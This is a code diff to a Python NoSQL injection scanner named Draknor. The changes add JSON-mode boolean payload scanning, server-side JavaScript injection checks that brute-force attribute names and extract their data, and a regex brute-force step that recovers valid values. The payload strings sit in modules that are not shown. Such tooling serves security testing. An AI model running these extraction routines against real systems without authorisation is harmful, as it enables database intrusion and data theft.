@@ -4,6 +4,8 @@ from payloads import *
 from utils import *
 import re
 from burputils import *
+from SSJI_enum import *
+from input_finder import *
 
 #TODO
 # implement custom fail string implementation
@@ -18,11 +20,18 @@ def scan_array_payloads():
     pass
 
 def scan_bool_payloads(attack_target, baseline_response,debug=False): 
-    print(f"[*] Starting bool payload scanning with {len(bool_payloads)} payloads...")   
+    if attack_target.request_body_type == PostRequestBodyType.JSON:
+        attack_payloads = bool_json_payloads
+    elif attack_target.request_body_type == PostRequestBodyType.FORM_URLENCODED:
+        attack_payloads = bool_payloads
+    else:
+        raise Exception(f"The request_body_type '{attack_target.request_body_type}' can not be handled in this version.")
+    
+    print(f"Starting '{attack_target.request_body_type}'-mode bool payload scanning with {len(attack_payloads)} payloads...")   
     success_payloads=[]
     error_payloads=[]
 
-    for payload, extraction_payload in bool_payloads:        
+    for payload, extraction_payload in attack_payloads:        
         #send request
         response = send_post_request(attack_target, payload,debug=debug)
 
@@ -38,21 +47,7 @@ def scan_bool_payloads(attack_target, baseline_response,debug=False):
     return success_payloads, error_payloads
 
 
-def verify_extraction_point(success_payloads, attack_target):
-    print("[+] Verifing SSJI extraction point...")
-    for _, extraction_payload in success_payloads:         
-        print(f"[*] Testing extraction payload: {extraction_payload}")
-        if send_extraction_request(attack_target, extraction_payload, "true"):                 
-            if not send_extraction_request(attack_target, extraction_payload, "false"):         
-                extraction_point = extraction_payload
-                break
 
-    if not extraction_point:
-        print("[-] No valid extraction point found")
-        exit()
-    else: 
-        print(f"[+] Valid extraction point found: {extraction_point}")
-        return extraction_point
 
 def create_form_data_obj(direct_url, form_extract_target, burp_file_path, scan_param_name, post_data):
     # extract post data from html form    
@@ -61,7 +56,7 @@ def create_form_data_obj(direct_url, form_extract_target, burp_file_path, scan_p
             raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
         return extract_form_data(form_extract_target,scan_param_name)
     elif direct_url:         
-        print("[*] Checking supplied form data...")      
+        print("Checking supplied form data...")      
         parsed_url = urlparse(direct_url)                
         attack_target = AttackTarget(
             url=f"{parsed_url.scheme}://{parsed_url.netloc}",
@@ -122,11 +117,11 @@ def init():
         raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
     
     if scan_param_name and f"§{scan_param_name}§" not in attack_target.parameters:
-        print(f"[*] Auto inserting placeholder in parameter {scan_param_name}...")
+        print(f"Auto inserting placeholder in parameter {scan_param_name}...")
         attack_target.parameters = replace_param_value(attack_target.parameters, attack_target.request_body_type, scan_param_name)
 
     if not scan_param_name:
-        print(f"[*] Auto extracting target parameter from supplied data {attack_target.parameters}...")
+        print(f"Auto extracting target parameter from supplied data {attack_target.parameters}...")
         pattern = r'=(§(.*?)§)'
 
         # Search for the pattern in the provided string
@@ -140,6 +135,31 @@ def init():
     return attack_target,verbose
 
 
+def check_SSJI(success_payloads, attack_target):
+    # verify extraction point    
+    extraction_point = SSJI_verify_extraction_point(success_payloads, attack_target)
+    if not extraction_point:
+        print("[-] No valid SSJI extraction point found")  
+        return      
+    else: 
+        print(f"[+] Valid SSJI extraction point found: {extraction_point}")        
+  
+    # enumerate attribute names
+    found_attributes = SSJI_brute_attribute_names(attack_target, extraction_point)
+
+    # extract data
+    results = []
+    for attr, length in found_attributes:
+        res = SSJI_brute_extract_data(attack_target, extraction_point, attr, length)
+        if res:
+            print(f"[data] {attr}:{res}")   
+            results.append([attr, res])
+        
+    # print results
+    print_results(found_attributes, results)
+
+
+    
 def main():
     print("--- Starting Draknor NoSQL Injection Scanner ---")
 
@@ -147,7 +167,7 @@ def main():
 
     print("[+] Attack target:", attack_target.http_verb,attack_target.get_target_url())
     print("[+] Parameters:", attack_target.parameters)
-    print("[*] Checking if form target page is reflective...")
+    print("Checking if form target page is reflective...")
 
     baseline_response = get_baseline_response(attack_target,debug=debug)
     attack_target.set_baseline_response(baseline_response)
@@ -166,34 +186,34 @@ def main():
         for p in success_payloads:
             print(f"\t {p[0]}")
         
-        # verify extraction point    
-        extraction_point = verify_extraction_point(success_payloads, attack_target)
-
-        # enumerate attribute names
-        found_attributes = brute_attribute_names(attack_target, extraction_point)
-
-        # extract data
-        results = []
-        for attr, length in found_attributes:
-            res = brute_extract_data(attack_target, baseline_response, extraction_point, attr, length)
-            if res:
-                print(f"[data] {attr}:{res}")   
-                results.append([attr, res])
+        # check for SSJI
+        check_SSJI(success_payloads, attack_target)    
+        
+        #brute valid input values
+        print("Testing for regex brute force...")        
+        for _, extraction_pay in success_payloads:
+            if "§regex_brute§" not in str(extraction_pay):
+                continue
+            length_list = regex_extract_get_length(attack_target, extraction_pay)
+            if length_list:
+                print(f"[+] Found values with length: {length_list}")            
+                res = regex_extract_brute_valid_values(attack_target, extraction_pay,length_list)
+                print(f"Found following valid values for {extraction_pay}:")
+                for e in res:
+                    print(f"\tValue: {e[1]}")
             
-        # print results
-        print_results(found_attributes, results)
-
-    #if args.arrays:  
-    #    scan_array_payloads()
-    
+        print("--- Draknor NoSQL Injection Scanner finished ---")        
     else:        
         print("[-] No successfull payloads found")
+    #if args.arrays:  
+    #    scan_array_payloads()
 
 try:
     main()
 except KeyboardInterrupt:
     print("\nCTRL+C detected! Draknor shuting down...")
 except Exception as e:
+    print()    
     traceback.print_exc()   
     print("\n") 
 
